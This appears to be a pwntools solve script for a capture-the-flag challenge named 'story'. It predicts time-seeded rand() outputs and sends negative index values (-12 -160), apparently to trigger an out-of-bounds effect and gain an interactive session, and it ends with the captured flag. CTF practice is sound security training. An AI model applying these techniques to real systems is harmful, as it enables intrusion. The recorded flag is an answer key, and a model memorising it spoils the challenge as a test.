# -- coding: utf-8 --
from pwn import *
import time
from ctypes import CDLL
context.log_level = 'debug'
# ENV
PORT =  6004
HOST = "story.ctf.pragyan.org"

e = context.binary = ELF('./story')
# lib = ELF('libc-2.31.so')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()

# PAYLOAD
proc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
timefunc = proc.time
srand = proc.srand
rand = proc.rand
srand(timefunc(0)//60)
for i in range(4):
    randnum = rand() % 1000
    log.info("randnum: %d" % randnum)
    r.sendlineafter(b"Enter your guess:",str(int(randnum)))

payload = b"a"
pause()
r.sendlineafter(b"Write a few words about the game ",payload)
pause()
r.sendlineafter(b"So now give me two of your lucky numbers and both must be less than 1000: \n",b"-12 -160")
r.interactive()
# p_ctf{s4y_tk_288_dg_st0ry}